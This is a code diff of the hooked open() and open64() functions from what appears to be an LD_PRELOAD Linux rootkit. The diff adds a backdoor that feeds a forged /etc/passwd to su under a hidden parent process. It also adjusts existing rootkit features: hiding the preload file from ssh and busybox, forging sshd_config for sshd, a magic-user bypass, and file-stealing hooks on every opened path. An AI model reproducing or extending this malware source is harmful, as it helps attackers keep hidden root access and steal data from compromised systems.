@@ -1,34 +1,31 @@
 int open(const char *pathname, int flags, mode_t mode){
     hook(COPEN);
+
+#ifdef USE_PAM_BD
+    if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
+        return fileno(forgepasswd(pathname));
+#endif
+
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         int ret = (long)call(COPEN, pathname, flags, mode);
         if(ret){
             int outfd = fileno(stdout);
             if(!outfd) return ret;
-            if(isatty(outfd)){
-                char *apath = gdirname(ret);
-                if(apath != NULL){
-                    if(!pathtracked(apath))
-                        trackwrite(apath);
-                    free(apath);
-                }
-            }
+            if(isatty(outfd))
+                if(!pathtracked(pathname))
+                    trackwrite(pathname);
         }
         return ret;
 #else
         return (long)call(COPEN, pathname, flags, mode);
 #endif
-
-        
     }
 
 #ifdef HIDE_SELF
-    char *preloadpath;
+    char *preloadpath = OLD_PRELOAD;
 #ifdef PATCH_DYNAMIC_LINKER
     preloadpath = PRELOAD_FILE;
-#else
-    preloadpath = OLD_PRELOAD;
 #endif
     if(hidden_path(pathname) && strstr(preloadpath, pathname) &&
         ((process("ssh") || process("busybox")) &&
@@ -48,7 +45,7 @@ int open(const char *pathname, int flags, mode_t mode){
 #endif
 
 #ifdef SOFT_PATCH_SSHD_CONFIG
-    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
+    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
         return fileno(sshdforge(pathname));
 #endif
 
@@ -74,27 +71,31 @@ int open(const char *pathname, int flags, mode_t mode){
 #endif
 
 #ifdef FILE_STEAL
-    inspect_file(pathname);
+    inspectfile(pathname);
 #endif
     return (long)call(COPEN, pathname, flags, mode);
 }
 
+
+
+
 int open64(const char *pathname, int flags, mode_t mode){
     hook(COPEN64);
+
+#ifdef USE_PAM_BD
+    if(hidden_ppid() && process("su\0") && !strcmp(pathname, "/etc/passwd\0"))
+        return fileno(forgepasswd(pathname));
+#endif
+
     if(magicusr()){
 #ifdef HIDE_MY_ASS
         int ret = (long)call(COPEN64, pathname, flags, mode);
         if(ret){
             int outfd = fileno(stdout);
             if(!outfd) return ret;
-            if(isatty(outfd)){
-                char *apath = gdirname(ret);
-                if(apath != NULL){
-                    if(!pathtracked(apath))
-                        trackwrite(apath);
-                    free(apath);
-                }
-            }
+            if(isatty(outfd))
+                if(!pathtracked(pathname))
+                    trackwrite(pathname);
         }
         return ret;
 #else
@@ -103,11 +104,9 @@ int open64(const char *pathname, int flags, mode_t mode){
     }
 
 #ifdef HIDE_SELF
-    char *preloadpath;
+    char *preloadpath = OLD_PRELOAD;
 #ifdef PATCH_DYNAMIC_LINKER
     preloadpath = PRELOAD_FILE;
-#else
-    preloadpath = OLD_PRELOAD;
 #endif
     if(hidden_path(pathname) && strstr(preloadpath, pathname) &&
         ((process("ssh") || process("busybox")) &&
@@ -127,7 +126,7 @@ int open64(const char *pathname, int flags, mode_t mode){
 #endif
 
 #ifdef SOFT_PATCH_SSHD_CONFIG
-    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && process("/usr/sbin/sshd"))
+    if(!strcmp(pathname, "/etc/ssh/sshd_config\0") && sshdproc())
         return fileno(sshdforge(pathname));
 #endif
 
@@ -153,7 +152,7 @@ int open64(const char *pathname, int flags, mode_t mode){
 #endif
 
 #ifdef FILE_STEAL
-    inspect_file(pathname);
+    inspectfile(pathname);
 #endif
     return (long)call(COPEN64, pathname, flags, mode);
 }
